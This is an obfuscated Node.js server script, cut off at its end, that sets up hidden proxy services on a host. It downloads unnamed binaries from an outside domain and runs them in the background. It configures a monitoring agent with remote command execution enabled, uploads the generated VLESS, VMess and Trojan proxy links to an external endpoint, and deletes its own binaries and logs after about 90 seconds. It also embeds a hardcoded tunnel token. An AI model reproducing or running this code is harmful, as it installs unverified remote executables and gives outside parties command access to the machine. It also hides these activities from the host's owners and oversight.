const _0x1c5993=_0x3154;(function(_0x2d4fb8,_0x6f0a86){const _0x571c0f=_0x3154,_0x2799ac=_0x2d4fb8();while(!![]){try{const _0x2a51e3=parseInt(_0x571c0f(0x29e))/0x1+-parseInt(_0x571c0f(0x20d))/0x2+parseInt(_0x571c0f(0x219))/0x3*(-parseInt(_0x571c0f(0x272))/0x4)+-parseInt(_0x571c0f(0x22f))/0x5+parseInt(_0x571c0f(0x23d))/0x6*(parseInt(_0x571c0f(0x1f5))/0x7)+-parseInt(_0x571c0f(0x238))/0x8*(-parseInt(_0x571c0f(0x25f))/0x9)+parseInt(_0x571c0f(0x2a2))/0xa*(parseInt(_0x571c0f(0x2a3))/0xb);if(_0x2a51e3===_0x6f0a86)break;else _0x2799ac['push'](_0x2799ac['shift']());}catch(_0xb0b3c){_0x2799ac['push'](_0x2799ac['shift']());}}}(_0x4790,0xe4b1d));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1c5993(0x243)),{promisify}=require(_0x1c5993(0x1ed)),exec=promisify(require(_0x1c5993(0x26e))[_0x1c5993(0x221)]),UPLOAD_URL=process[_0x1c5993(0x230)][_0x1c5993(0x1f7)]||'',PROJECT_URL=process[_0x1c5993(0x230)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1c5993(0x230)][_0x1c5993(0x289)]||![],FILE_PATH=process[_0x1c5993(0x230)]['FILE_PATH']||'.tmp',SUB_PATH=process['env'][_0x1c5993(0x1ee)]||_0x1c5993(0x264),PORT=process['env'][_0x1c5993(0x279)]||process[_0x1c5993(0x230)][_0x1c5993(0x225)]||0xbb8,UUID=process['env'][_0x1c5993(0x202)]||_0x1c5993(0x214),NEZHA_SERVER=process[_0x1c5993(0x230)][_0x1c5993(0x241)]||'',NEZHA_PORT=process[_0x1c5993(0x230)][_0x1c5993(0x227)]||'',NEZHA_KEY=process[_0x1c5993(0x230)][_0x1c5993(0x27d)]||'',ARGO_DOMAIN=process['env'][_0x1c5993(0x28f)]||_0x1c5993(0x273),ARGO_AUTH=process[_0x1c5993(0x230)]['ARGO_AUTH']||_0x1c5993(0x285),ARGO_PORT=process[_0x1c5993(0x230)][_0x1c5993(0x242)]||0x1f41,CFIP=process[_0x1c5993(0x230)][_0x1c5993(0x26b)]||_0x1c5993(0x208),CFPORT=process['env'][_0x1c5993(0x22c)]||0x1bb,NAME=process[_0x1c5993(0x230)][_0x1c5993(0x2a0)]||_0x1c5993(0x217);!fs['existsSync'](FILE_PATH)?(fs[_0x1c5993(0x262)](FILE_PATH),console['log'](FILE_PATH+_0x1c5993(0x1e6))):console[_0x1c5993(0x20f)](FILE_PATH+_0x1c5993(0x1ea));function generateRandomName(){const _0x4b0352=_0x1c5993,_0x1d7fa7=_0x4b0352(0x24a);let _0x1a3133='';for(let _0x2e04c1=0x0;_0x2e04c1<0x6;_0x2e04c1++){_0x1a3133+=_0x1d7fa7[_0x4b0352(0x276)](Math['floor'](Math[_0x4b0352(0x283)]()*_0x1d7fa7['length']));}return _0x1a3133;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1c5993(0x210)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1c5993(0x210)](FILE_PATH,webName),botPath=path[_0x1c5993(0x210)](FILE_PATH,botName),subPath=path[_0x1c5993(0x210)](FILE_PATH,_0x1c5993(0x274)),listPath=path[_0x1c5993(0x210)](FILE_PATH,_0x1c5993(0x284)),bootLogPath=path[_0x1c5993(0x210)](FILE_PATH,'boot.log'),configPath=path[_0x1c5993(0x210)](FILE_PATH,_0x1c5993(0x1e8));function deleteNodes(){const _0x350e2d=_0x1c5993;try{if(!UPLOAD_URL)return;if(!fs[_0x350e2d(0x293)](subPath))return;let _0x25c29b;try{_0x25c29b=fs[_0x350e2d(0x20a)](subPath,_0x350e2d(0x28b));}catch{return null;}const _0x101339=Buffer[_0x350e2d(0x22e)](_0x25c29b,_0x350e2d(0x271))['toString']('utf-8'),_0x3d453e=_0x101339[_0x350e2d(0x23b)]('\x0a')[_0x350e2d(0x23f)](_0x128ff8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x350e2d(0x1fb)](_0x128ff8));if(_0x3d453e['length']===0x0)return;return axios[_0x350e2d(0x24f)](UPLOAD_URL+_0x350e2d(0x2a7),JSON[_0x350e2d(0x201)]({'nodes':_0x3d453e}),{'headers':{'Content-Type':_0x350e2d(0x209)}})['catch'](_0x1ef2f5=>{return null;}),null;}catch(_0x1fc8b6){return null;}}function cleanupOldFiles(){const _0x1f877d=_0x1c5993;try{const _0x267c26=fs['readdirSync'](FILE_PATH);_0x267c26[_0x1f877d(0x204)](_0xaa6609=>{const _0x108ebf=_0x1f877d,_0x3188b3=path['join'](FILE_PATH,_0xaa6609);try{const _0x2733f1=fs[_0x108ebf(0x2a1)](_0x3188b3);_0x2733f1[_0x108ebf(0x24c)]()&&fs[_0x108ebf(0x1f8)](_0x3188b3);}catch(_0x3bbacc){}});}catch(_0x1fbc3f){}}async function generateConfig(){const _0x3d5c88=_0x1c5993,_0x370587={'log':{'access':_0x3d5c88(0x1fc),'error':_0x3d5c88(0x1fc),'loglevel':_0x3d5c88(0x1fd)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3d5c88(0x2a4),'settings':{'clients':[{'id':UUID,'flow':_0x3d5c88(0x206)}],'decryption':_0x3d5c88(0x1fd),'fallbacks':[{'dest':0xbb9},{'path':_0x3d5c88(0x240),'dest':0xbba},{'path':_0x3d5c88(0x1fe),'dest':0xbbb},{'path':_0x3d5c88(0x27f),'dest':0xbbc}]},'streamSettings':{'network':_0x3d5c88(0x267)}},{'port':0xbb9,'listen':_0x3d5c88(0x245),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x3d5c88(0x1fd)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3d5c88(0x2a4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d5c88(0x1fd)},'streamSettings':{'network':'ws','security':_0x3d5c88(0x1fd),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3d5c88(0x29b),_0x3d5c88(0x1fa),_0x3d5c88(0x27a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3d5c88(0x245),'protocol':_0x3d5c88(0x246),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3d5c88(0x1fe)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d5c88(0x29b),'tls',_0x3d5c88(0x27a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3d5c88(0x245),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3d5c88(0x1fd),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3d5c88(0x29b),_0x3d5c88(0x1fa),_0x3d5c88(0x27a)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x3d5c88(0x28e)},{'protocol':_0x3d5c88(0x2a6),'tag':_0x3d5c88(0x1f2)}]};fs[_0x3d5c88(0x20e)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x370587,null,0x2));}function getSystemArchitecture(){const _0x59e030=_0x1c5993,_0x2f94c0=os[_0x59e030(0x278)]();return _0x2f94c0===_0x59e030(0x28d)||_0x2f94c0===_0x59e030(0x207)||_0x2f94c0==='aarch64'?'arm':_0x59e030(0x25e);}function downloadFile(_0x49ced1,_0x3c25a1,_0x1726a3){const _0x538960=_0x1c5993,_0x3618d0=_0x49ced1;!fs[_0x538960(0x293)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x282518=fs[_0x538960(0x252)](_0x3618d0);axios({'method':_0x538960(0x1e7),'url':_0x3c25a1,'responseType':_0x538960(0x228)})[_0x538960(0x288)](_0x3e099a=>{const _0x2654e5=_0x538960;_0x3e099a['data']['pipe'](_0x282518),_0x282518['on'](_0x2654e5(0x20b),()=>{const _0x9bfb76=_0x2654e5;_0x282518[_0x9bfb76(0x1f4)](),console['log']('Download\x20'+path[_0x9bfb76(0x258)](_0x3618d0)+_0x9bfb76(0x259)),_0x1726a3(null,_0x3618d0);}),_0x282518['on'](_0x2654e5(0x253),_0x5d43c1=>{const _0x200332=_0x2654e5;fs['unlink'](_0x3618d0,()=>{});const _0x3a4820=_0x200332(0x29c)+path[_0x200332(0x258)](_0x3618d0)+'\x20failed:\x20'+_0x5d43c1[_0x200332(0x294)];console['error'](_0x3a4820),_0x1726a3(_0x3a4820);});})[_0x538960(0x222)](_0xd1ee8c=>{const _0x50bc83=_0x538960,_0x4b44dc=_0x50bc83(0x29c)+path[_0x50bc83(0x258)](_0x3618d0)+'\x20failed:\x20'+_0xd1ee8c[_0x50bc83(0x294)];console['error'](_0x4b44dc),_0x1726a3(_0x4b44dc);});}function _0x3154(_0xc30442,_0x3155d7){_0xc30442=_0xc30442-0x1e5;const _0x479068=_0x4790();let _0x315431=_0x479068[_0xc30442];return _0x315431;}async function downloadFilesAndRun(){const _0x2500bc=_0x1c5993,_0x7b3dfc=getSystemArchitecture(),_0x276ece=getFilesForArchitecture(_0x7b3dfc);if(_0x276ece[_0x2500bc(0x257)]===0x0){console[_0x2500bc(0x20f)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x1dee9d=_0x276ece['map'](_0x190983=>{return new Promise((_0x4903c8,_0x30dba6)=>{const _0x173bea=_0x3154;downloadFile(_0x190983[_0x173bea(0x224)],_0x190983[_0x173bea(0x22d)],(_0x14159c,_0x4e2e11)=>{_0x14159c?_0x30dba6(_0x14159c):_0x4903c8(_0x4e2e11);});});});try{await Promise['all'](_0x1dee9d);}catch(_0x379678){console[_0x2500bc(0x253)]('Error\x20downloading\x20files:',_0x379678);return;}function _0x2d9773(_0x3cbad9){const _0x25590f=_0x2500bc,_0x5cd240=0x1fd;_0x3cbad9[_0x25590f(0x204)](_0x3c0c61=>{const _0x26b07b=_0x25590f;fs[_0x26b07b(0x293)](_0x3c0c61)&&fs[_0x26b07b(0x27b)](_0x3c0c61,_0x5cd240,_0x31899d=>{const _0x2aebdc=_0x26b07b;_0x31899d?console[_0x2aebdc(0x253)](_0x2aebdc(0x23a)+_0x3c0c61+':\x20'+_0x31899d):console['log'](_0x2aebdc(0x265)+_0x3c0c61+':\x20'+_0x5cd240[_0x2aebdc(0x260)](0x8));});});}const _0x1f7fa3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2d9773(_0x1f7fa3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e152d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2500bc(0x23b)](':')['pop']():'',_0x518b00=new Set([_0x2500bc(0x249),_0x2500bc(0x26a),_0x2500bc(0x29f),_0x2500bc(0x28a),'2083','2053']),_0x258f20=_0x518b00[_0x2500bc(0x203)](_0x5e152d)?'true':_0x2500bc(0x21c),_0x23d146='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x258f20+_0x2500bc(0x226)+UUID;fs[_0x2500bc(0x20e)](path[_0x2500bc(0x210)](FILE_PATH,_0x2500bc(0x263)),_0x23d146);const _0x11ef0=_0x2500bc(0x25d)+phpPath+_0x2500bc(0x266)+FILE_PATH+_0x2500bc(0x1ff);try{await exec(_0x11ef0),console[_0x2500bc(0x20f)](phpName+_0x2500bc(0x216)),await new Promise(_0x55d9a6=>setTimeout(_0x55d9a6,0x3e8));}catch(_0x40b28f){console[_0x2500bc(0x253)](_0x2500bc(0x21f)+_0x40b28f);}}else{let _0x7105c6='';const _0x37788f=[_0x2500bc(0x249),_0x2500bc(0x26a),_0x2500bc(0x29f),_0x2500bc(0x28a),_0x2500bc(0x229),_0x2500bc(0x223)];_0x37788f[_0x2500bc(0x25c)](NEZHA_PORT)&&(_0x7105c6=_0x2500bc(0x1eb));const _0xbaa453=_0x2500bc(0x25d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x7105c6+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xbaa453),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x344666=>setTimeout(_0x344666,0x3e8));}catch(_0x1bc2a4){console[_0x2500bc(0x253)](_0x2500bc(0x280)+_0x1bc2a4);}}}else console['log'](_0x2500bc(0x254));const _0x109ef1='nohup\x20'+webPath+_0x2500bc(0x1ef)+FILE_PATH+_0x2500bc(0x211);try{await exec(_0x109ef1),console[_0x2500bc(0x20f)](webName+_0x2500bc(0x216)),await new Promise(_0x3f653b=>setTimeout(_0x3f653b,0x3e8));}catch(_0x2b94b9){console['error'](_0x2500bc(0x270)+_0x2b94b9);}if(fs['existsSync'](botPath)){let _0x41d1d1;if(ARGO_AUTH[_0x2500bc(0x22b)](/^[A-Z0-9a-z=]{120,250}$/))_0x41d1d1=_0x2500bc(0x275)+ARGO_AUTH;else ARGO_AUTH[_0x2500bc(0x22b)](/TunnelSecret/)?_0x41d1d1=_0x2500bc(0x287)+FILE_PATH+_0x2500bc(0x296):_0x41d1d1=_0x2500bc(0x261)+FILE_PATH+_0x2500bc(0x295)+ARGO_PORT;try{await exec(_0x2500bc(0x25d)+botPath+'\x20'+_0x41d1d1+_0x2500bc(0x232)),console[_0x2500bc(0x20f)](botName+_0x2500bc(0x216)),await new Promise(_0x2aabb6=>setTimeout(_0x2aabb6,0x7d0));}catch(_0x35e3b9){console[_0x2500bc(0x253)]('Error\x20executing\x20command:\x20'+_0x35e3b9);}}await new Promise(_0x5a9c2b=>setTimeout(_0x5a9c2b,0x1388));}function getFilesForArchitecture(_0x2f900a){const _0x2e0a7d=_0x1c5993;let _0xd95af1;_0x2f900a==='arm'?_0xd95af1=[{'fileName':webPath,'fileUrl':_0x2e0a7d(0x20c)},{'fileName':botPath,'fileUrl':_0x2e0a7d(0x29a)}]:_0xd95af1=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x2e0a7d(0x237)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1939b2=_0x2f900a===_0x2e0a7d(0x28d)?'https://arm64.ssss.nyc.mn/agent':_0x2e0a7d(0x24b);_0xd95af1[_0x2e0a7d(0x297)]({'fileName':npmPath,'fileUrl':_0x1939b2});}else{const _0x37ad68=_0x2f900a===_0x2e0a7d(0x28d)?_0x2e0a7d(0x292):'https://amd64.ssss.nyc.mn/v1';_0xd95af1['unshift']({'fileName':phpPath,'fileUrl':_0x37ad68});}}return _0xd95af1;}function argoType(){const _0x2edb23=_0x1c5993;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2edb23(0x20f)](_0x2edb23(0x277));return;}if(ARGO_AUTH[_0x2edb23(0x25c)](_0x2edb23(0x218))){fs['writeFileSync'](path[_0x2edb23(0x210)](FILE_PATH,_0x2edb23(0x256)),ARGO_AUTH);const _0x4039bc=_0x2edb23(0x236)+ARGO_AUTH['split']('\x22')[0xb]+_0x2edb23(0x231)+path[_0x2edb23(0x210)](FILE_PATH,_0x2edb23(0x256))+_0x2edb23(0x1e9)+ARGO_DOMAIN+_0x2edb23(0x291)+ARGO_PORT+_0x2edb23(0x234);fs['writeFileSync'](path[_0x2edb23(0x210)](FILE_PATH,_0x2edb23(0x244)),_0x4039bc);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x1ac782=_0x1c5993;let _0x804b99;if(ARGO_AUTH&&ARGO_DOMAIN)_0x804b99=ARGO_DOMAIN,console[_0x1ac782(0x20f)](_0x1ac782(0x235),_0x804b99),await _0x3ad23e(_0x804b99);else try{const _0x20ec7a=fs[_0x1ac782(0x20a)](path[_0x1ac782(0x210)](FILE_PATH,_0x1ac782(0x215)),_0x1ac782(0x28b)),_0x286291=_0x20ec7a[_0x1ac782(0x23b)]('\x0a'),_0x375e0c=[];_0x286291[_0x1ac782(0x204)](_0xbaf8f2=>{const _0x44af88=_0x1ac782,_0x57e02d=_0xbaf8f2['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x57e02d){const _0x478481=_0x57e02d[0x1];_0x375e0c[_0x44af88(0x282)](_0x478481);}});if(_0x375e0c[_0x1ac782(0x257)]>0x0)_0x804b99=_0x375e0c[0x0],console[_0x1ac782(0x20f)]('ArgoDomain:',_0x804b99),await _0x3ad23e(_0x804b99);else{console[_0x1ac782(0x20f)](_0x1ac782(0x250)),fs[_0x1ac782(0x1f8)](path[_0x1ac782(0x210)](FILE_PATH,_0x1ac782(0x215)));async function _0x3a936d(){const _0x2b9899=_0x1ac782;try{process['platform']==='win32'?await exec(_0x2b9899(0x269)+botName+_0x2b9899(0x21b)):await exec('pkill\x20-f\x20\x22['+botName[_0x2b9899(0x276)](0x0)+']'+botName[_0x2b9899(0x26d)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x199886){}}_0x3a936d(),await new Promise(_0xae081d=>setTimeout(_0xae081d,0xbb8));const _0x11c906=_0x1ac782(0x261)+FILE_PATH+_0x1ac782(0x295)+ARGO_PORT;try{await exec(_0x1ac782(0x25d)+botPath+'\x20'+_0x11c906+_0x1ac782(0x232)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x1702ea=>setTimeout(_0x1702ea,0xbb8)),await extractDomains();}catch(_0x1ea4af){console[_0x1ac782(0x253)]('Error\x20executing\x20command:\x20'+_0x1ea4af);}}}catch(_0x43c4fb){console['error'](_0x1ac782(0x29d),_0x43c4fb);}async function _0x723913(){const _0x3ef935=_0x1ac782;try{const _0x312859=await axios[_0x3ef935(0x1e7)](_0x3ef935(0x1f9),{'timeout':0xbb8});if(_0x312859['data']&&_0x312859[_0x3ef935(0x1f3)]['country_code']&&_0x312859[_0x3ef935(0x1f3)][_0x3ef935(0x1f0)])return _0x312859[_0x3ef935(0x1f3)][_0x3ef935(0x23e)]+'_'+_0x312859[_0x3ef935(0x1f3)][_0x3ef935(0x1f0)];}catch(_0x291b43){try{const _0x380f52=await axios[_0x3ef935(0x1e7)](_0x3ef935(0x1f6),{'timeout':0xbb8});if(_0x380f52[_0x3ef935(0x1f3)]&&_0x380f52[_0x3ef935(0x1f3)][_0x3ef935(0x290)]==='success'&&_0x380f52[_0x3ef935(0x1f3)][_0x3ef935(0x25b)]&&_0x380f52[_0x3ef935(0x1f3)]['org'])return _0x380f52[_0x3ef935(0x1f3)][_0x3ef935(0x25b)]+'_'+_0x380f52['data']['org'];}catch(_0x3aa20e){}}return _0x3ef935(0x220);}async function _0x3ad23e(_0xbf8d36){const _0x227b49=await _0x723913(),_0x383d90=NAME?NAME+'-'+_0x227b49:_0x227b49;return new Promise(_0x40b15e=>{setTimeout(()=>{const _0x269828=_0x3154,_0x491f47={'v':'2','ps':''+_0x383d90,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x269828(0x1fd),'net':'ws','type':_0x269828(0x1fd),'host':_0xbf8d36,'path':_0x269828(0x1f1),'tls':_0x269828(0x1fa),'sni':_0xbf8d36,'alpn':'','fp':_0x269828(0x27c)},_0x2dc54a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x269828(0x27e)+_0xbf8d36+_0x269828(0x268)+_0xbf8d36+_0x269828(0x28c)+_0x383d90+_0x269828(0x247)+Buffer['from'](JSON[_0x269828(0x201)](_0x491f47))[_0x269828(0x260)]('base64')+_0x269828(0x26f)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xbf8d36+_0x269828(0x268)+_0xbf8d36+_0x269828(0x299)+_0x383d90+_0x269828(0x233);console[_0x269828(0x20f)](Buffer[_0x269828(0x22e)](_0x2dc54a)[_0x269828(0x260)](_0x269828(0x271))),fs[_0x269828(0x20e)](subPath,Buffer['from'](_0x2dc54a)['toString'](_0x269828(0x271))),console[_0x269828(0x20f)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5bf6e2,_0x340cdd)=>{const _0x1dc0c7=_0x269828,_0x20349e=Buffer[_0x1dc0c7(0x22e)](_0x2dc54a)['toString'](_0x1dc0c7(0x271));_0x340cdd['set'](_0x1dc0c7(0x26c),_0x1dc0c7(0x21d)),_0x340cdd[_0x1dc0c7(0x212)](_0x20349e);}),_0x40b15e(_0x2dc54a);},0x7d0);});}}async function uploadNodes(){const _0x50bc0e=_0x1c5993;if(UPLOAD_URL&&PROJECT_URL){const _0x4fad22=PROJECT_URL+'/'+SUB_PATH,_0x2575d0={'subscription':[_0x4fad22]};try{const _0x2b6e1f=await axios[_0x50bc0e(0x24f)](UPLOAD_URL+'/api/add-subscriptions',_0x2575d0,{'headers':{'Content-Type':_0x50bc0e(0x209)}});return _0x2b6e1f&&_0x2b6e1f[_0x50bc0e(0x290)]===0xc8?(console[_0x50bc0e(0x20f)]('Subscription\x20uploaded\x20successfully'),_0x2b6e1f):null;}catch(_0x1b1bae){if(_0x1b1bae[_0x50bc0e(0x200)]){if(_0x1b1bae[_0x50bc0e(0x200)][_0x50bc0e(0x290)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x50bc0e(0x293)](listPath))return;const _0x41ed7c=fs[_0x50bc0e(0x20a)](listPath,'utf-8'),_0x505a0e=_0x41ed7c['split']('\x0a')[_0x50bc0e(0x23f)](_0x578a41=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x50bc0e(0x1fb)](_0x578a41));if(_0x505a0e[_0x50bc0e(0x257)]===0x0)return;const _0x2e1429=JSON[_0x50bc0e(0x201)]({'nodes':_0x505a0e});try{const _0x24d5db=await axios[_0x50bc0e(0x24f)](UPLOAD_URL+_0x50bc0e(0x24e),_0x2e1429,{'headers':{'Content-Type':_0x50bc0e(0x209)}});return _0x24d5db&&_0x24d5db[_0x50bc0e(0x290)]===0xc8?(console[_0x50bc0e(0x20f)](_0x50bc0e(0x24d)),_0x24d5db):null;}catch(_0x494071){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x39d5f5=_0x3154,_0x2ab073=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2ab073[_0x39d5f5(0x282)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2ab073[_0x39d5f5(0x282)](phpPath);process[_0x39d5f5(0x21a)]==='win32'?exec(_0x39d5f5(0x21e)+_0x2ab073[_0x39d5f5(0x210)]('\x20')+_0x39d5f5(0x281),_0x283b52=>{const _0x30d289=_0x39d5f5;console[_0x30d289(0x2a5)](),console[_0x30d289(0x20f)](_0x30d289(0x1e5)),console['log'](_0x30d289(0x298));}):exec(_0x39d5f5(0x213)+_0x2ab073[_0x39d5f5(0x210)]('\x20')+_0x39d5f5(0x255),_0x40ef24=>{const _0x491862=_0x39d5f5;console['clear'](),console['log']('App\x20is\x20running'),console['log'](_0x491862(0x298));});},0x15f90);}function _0x4790(){const _0x21762c=['5044457kSFfNB','vless','clear','blackhole','/api/delete-nodes','App\x20is\x20running','\x20is\x20created','get','config.json','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20already\x20exists','--tls','Error\x20in\x20startserver:','util','SUB_PATH','\x20-c\x20','org','/vmess-argo?ed=2560','block','data','close','10733653AxLMGE','http://ip-api.com/json','UPLOAD_URL','unlinkSync','https://ipapi.co/json','tls','test','/dev/null','none','/vmess-argo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','response','stringify','UUID','has','forEach','Add\x20automatic\x20access\x20task\x20faild:\x20','xtls-rprx-vision','arm64','cdns.doon.eu.org','application/json','readFileSync','finish','https://arm64.ssss.nyc.mn/web','1542678lSkbIl','writeFileSync','log','join','/config.json\x20>/dev/null\x202>&1\x20&','send','rm\x20-rf\x20','8230b18e-533f-44f3-8b6b-b5fd8263b640','boot.log','\x20is\x20running','zjz','TunnelSecret','9PigNZJ','platform','.exe\x20>\x20nul\x202>&1','false','text/plain;\x20charset=utf-8','del\x20/f\x20/q\x20','php\x20running\x20error:\x20','Unknown','exec','catch','2053','fileName','PORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NEZHA_PORT','stream','2083','Unhandled\x20error\x20in\x20startserver:','match','CFPORT','fileUrl','from','3469125yeOfFb','env','\x0a\x20\x20credentials-file:\x20','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_DOMAIN:','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/bot','10392OuFZGS','Skipping\x20adding\x20automatic\x20access\x20task','Empowerment\x20failed\x20for\x20','split','https://oooo.serv00.net/add-url','6etadgs','country_code','filter','/vless-argo','NEZHA_SERVER','ARGO_PORT','path','tunnel.yml','127.0.0.1','vmess','\x0a\x0avmess://','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','443','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/agent','isFile','Nodes\x20uploaded\x20successfully','/api/add-nodes','post','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','utf8','createWriteStream','error','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20>/dev/null\x202>&1','tunnel.json','length','basename','\x20successfully','automatic\x20access\x20task\x20added\x20successfully','countryCode','includes','nohup\x20','amd','2340lMRrLW','toString','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','mkdirSync','config.yaml','tau','Empowerment\x20success\x20for\x20','\x20-c\x20\x22','tcp','&fp=firefox&type=ws&host=','taskkill\x20/f\x20/im\x20','8443','CFIP','Content-Type','substring','child_process','\x0a\x0atrojan://','web\x20running\x20error:\x20','base64','1466932vkbfaw','tail.906969.xyz','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','charAt','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','arch','SERVER_PORT','quic','chmod','firefox','NEZHA_KEY','?encryption=none&security=tls&sni=','/trojan-argo','npm\x20running\x20error:\x20','\x20>\x20nul\x202>&1','push','random','list.txt','eyJhIjoiN2M0M2UyMGFiZWM1NzEyZmY4YWRmN2NiM2UxNWJkZmYiLCJ0IjoiZDBiYWJiNTQtZDhlOC00MWRkLTgzMWYtOWE3N2E3YWYyZDdiIiwicyI6Ik1XWmhPV0ptTnpFdE5tVXhaaTAwTnpRMkxUaGtZall0TW1JNE1qQTFZams0T0RWayJ9','readFile','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','then','AUTO_ACCESS','2087','utf-8','&path=%2Fvless-argo%3Fed%3D2560#','arm','direct','ARGO_DOMAIN','status','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://arm64.ssss.nyc.mn/v1','existsSync','message','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/tunnel.yml\x20run','unshift','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Ftrojan-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/bot','http','Download\x20','Error\x20reading\x20boot.log:','1172390ejNTrj','2096','NAME','statSync','10hxJzPN'];_0x4790=function(){return _0x21762c;};return _0x4790();}cleanFiles();async function AddVisitTask(){const _0x3b6187=_0x1c5993;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3b6187(0x20f)](_0x3b6187(0x239));return;}try{const _0x442cfd=await axios[_0x3b6187(0x24f)](_0x3b6187(0x23c),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3b6187(0x209)}});return console[_0x3b6187(0x20f)](_0x3b6187(0x25a)),_0x442cfd;}catch(_0x3d96ea){return console[_0x3b6187(0x253)](_0x3b6187(0x205)+_0x3d96ea[_0x3b6187(0x294)]),null;}}async function startserver(){const _0x4a8af7=_0x1c5993;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3c2a35){console[_0x4a8af7(0x253)](_0x4a8af7(0x1ec),_0x3c2a35);}}startserver()[_0x1c5993(0x222)](_0x1c02f3=>{const _0x1cf768=_0x1c5993;console['error'](_0x1cf768(0x22a),_0x1c02f3);}),app[_0x1c5993(0x1e7)]('/',async function(_0x3899da,_0x3b05e4){const _0x58713c=_0x1c5993;try{const _0x20c1cb=path[_0x58713c(0x210)](__dirname,'index.html'),_0x5de23c=await 